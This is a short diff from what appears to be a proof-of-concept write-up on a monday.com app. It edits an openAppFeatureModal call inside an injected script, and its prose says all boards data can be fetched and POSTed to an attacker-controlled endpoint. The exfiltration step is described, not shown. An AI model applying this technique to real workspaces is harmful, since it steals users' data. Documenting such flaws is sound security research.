@@ -12,7 +12,7 @@
         document.body.appendChild(element);
       });
     monday.listen("events", (response) => console.log(response));
-    monday.execute('openAppFeatureModal', { urlPath: 'https://javascript.com'})
+    monday.execute('openAppFeatureModal', { urlPath: 'https://javascript.com', height: '500px', width: '500px'})
   </script>
   Get all boards data.
   After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
